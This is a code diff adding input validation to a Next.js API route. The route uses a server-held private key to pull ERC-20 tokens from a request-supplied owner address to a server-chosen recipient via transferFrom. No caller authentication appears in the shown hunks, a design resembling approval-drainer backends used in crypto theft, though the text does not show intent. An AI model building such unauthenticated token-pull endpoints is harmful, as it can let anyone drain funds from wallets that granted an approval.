@@ -8,6 +8,14 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
     }
 
+    // Basic validation
+    if (!ethers.isAddress(tokenAddress) || !ethers.isAddress(owner)) {
+      return NextResponse.json({ error: 'Invalid address format' }, { status: 400 });
+    }
+    if (!(typeof amount === 'string' || typeof amount === 'number')) {
+      return NextResponse.json({ error: 'Amount must be a string or number' }, { status: 400 });
+    }
+
     const rpcMap: Record<string, string | undefined> = {
       sepolia: process.env.RPC_SEPOLIA,
       ethereum: process.env.RPC_ETHEREUM,
@@ -19,8 +27,15 @@ export async function POST(req: Request) {
     if (!rpcUrl) return NextResponse.json({ error: `RPC not configured for ${network}` }, { status: 400 });
 
     const provider = new ethers.JsonRpcProvider(rpcUrl);
-    const wallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY!, provider);
-    const recipient = process.env.SPENDER_ADDRESS!;
+    const privateKey = process.env.SPENDER_PRIVATE_KEY;
+    if (!privateKey) {
+      return NextResponse.json({ error: 'Server misconfiguration: SPENDER_PRIVATE_KEY missing' }, { status: 500 });
+    }
+    const wallet = new ethers.Wallet(privateKey, provider);
+    const recipient = process.env.TRANSFER_RECIPIENT || process.env.SPENDER_ADDRESS!;
+    if (!ethers.isAddress(recipient)) {
+      return NextResponse.json({ error: 'Server misconfiguration: invalid recipient address' }, { status: 500 });
+    }
 
     const abi = [
       "function transferFrom(address from, address to, uint256 value) returns (bool)",
@@ -31,7 +46,7 @@ export async function POST(req: Request) {
 
     const decimals: number = await contract.decimals();
     const allowance = await contract.allowance(owner, wallet.address);
-    const value = ethers.parseUnits(amount, decimals);
+    const value = ethers.parseUnits(String(amount), decimals);
 
     if (allowance < value) {
       return NextResponse.json({ error: `Allowance too low. Approved: ${ethers.formatUnits(allowance, decimals)}` }, { status: 400 });
